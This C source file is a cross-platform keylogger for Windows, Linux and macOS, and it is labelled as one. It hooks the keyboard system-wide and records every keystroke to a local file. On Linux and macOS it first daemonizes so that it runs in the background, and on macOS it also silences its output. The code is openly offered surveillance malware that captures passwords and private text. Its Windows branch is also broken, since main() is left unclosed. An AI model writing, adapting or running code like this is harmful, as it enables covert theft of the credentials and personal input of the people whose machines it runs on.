#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#ifdef _WIN32  // Windows Version
#include <windows.h>

HHOOK hHook;
FILE *log_file;

char getCharFromKey(DWORD vkCode) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WORD character;
    if (ToAscii(vkCode, MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC), keyboardState, &character, 0) == 1) {
        return (char)character;
    }
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char keyChar = getCharFromKey(p->vkCode);
        if (keyChar) {
            // Save to the user's Documents folder
            char logPath[MAX_PATH];
            snprintf(logPath, sizeof(logPath), "%s\\Documents\\keystrokes.txt", getenv("USERPROFILE"));
            log_file = fopen(logPath, "a");
            if (log_file) {
                fprintf(log_file, "%c", keyChar);
                fclose(log_file);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    printf("System-wide keylogger running... (Windows)\n");

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        printf("Failed to set hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;

#elif __linux__  // Linux Version
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>

// current path is specific to latest ubuntu have not checked other systems
#define DEVICE "/dev/input/by-path/platform-i8042-serio-0-event-kbd"  // Change to your keyboard event file

void daemonize() {
    pid_t pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS); // parent exits

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    pid = fork();
    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0)
        exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

int main() {
    struct input_event ev;
    int fd = open(DEVICE, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open device (Run as root)");
        return 1;
    }

    daemonize();

    printf("System-wide keylogger running... (Linux)\n");

    FILE *log_file;
    while (1) {
        read(fd, &ev, sizeof(struct input_event));
        if (ev.type == EV_KEY && ev.value == 1) {  // Key press event
            // Save to /tmp/keystrokes.txt
            log_file = fopen("/tmp/keystrokes.txt", "a");
            if (log_file) {
                fprintf(log_file, "Key %d pressed\n", ev.code);
                fclose(log_file);
            }
        }
    }
    close(fd);
    return 0;

#elif __APPLE__  // macOS Version
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

void daemonize() {
    pid_t pid = fork();

    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS); // Parent process exits
    }

    if (setsid() < 0) {
        exit(EXIT_FAILURE); // Start a new session
    }

    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        exit(EXIT_SUCCESS); // Parent process exits
    }

    umask(0); // Set file permissions
    chdir("/"); // Change to root directory

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x); // Close all open file descriptors
    }

    open("/dev/null", O_RDWR); // Redirect stdin, stdout, stderr to /dev/null
    dup(0);
    dup(0);
}

FILE *log_file;

char getCharFromKey(CGEventRef event) {
    UniChar unicodeString[4];
    UniCharCount actualStringLength;

    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardLayoutInputSource();
    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);

    UInt32 keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    UInt32 modifierKeys = (CGEventGetFlags(event) & kCGEventFlagMaskAlphaShift) ? shiftKey : 0;
    UInt32 deadKeyState = 0;

    UCKeyTranslate(keyboardLayout, keyCode, kUCKeyActionDown, modifierKeys, LMGetKbdType(),
                   kUCKeyTranslateNoDeadKeysMask, &deadKeyState, 4, &actualStringLength, unicodeString);

    CFRelease(currentKeyboard);
    return (char)unicodeString[0];
}

CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        char keyChar = getCharFromKey(event);
        if (keyChar) {
            // Save to /tmp/keystrokes.txt
            log_file = fopen("/tmp/keystrokes.txt", "a");
            if (log_file) {
                fprintf(log_file, "%c", keyChar);
                fclose(log_file);
            }
        }
    }
    return event;
}

int main() {
    daemonize();
    printf("System-wide keylogger running... (macOS)\n");

    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, kCGEventMaskForAllEvents, event_callback, NULL);
    if (!eventTap) {
        printf("Failed to create event tap (Check permissions)\n");
        return 1;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();

    return 0;
    }

#else
#error "Unsupported OS"
#endif
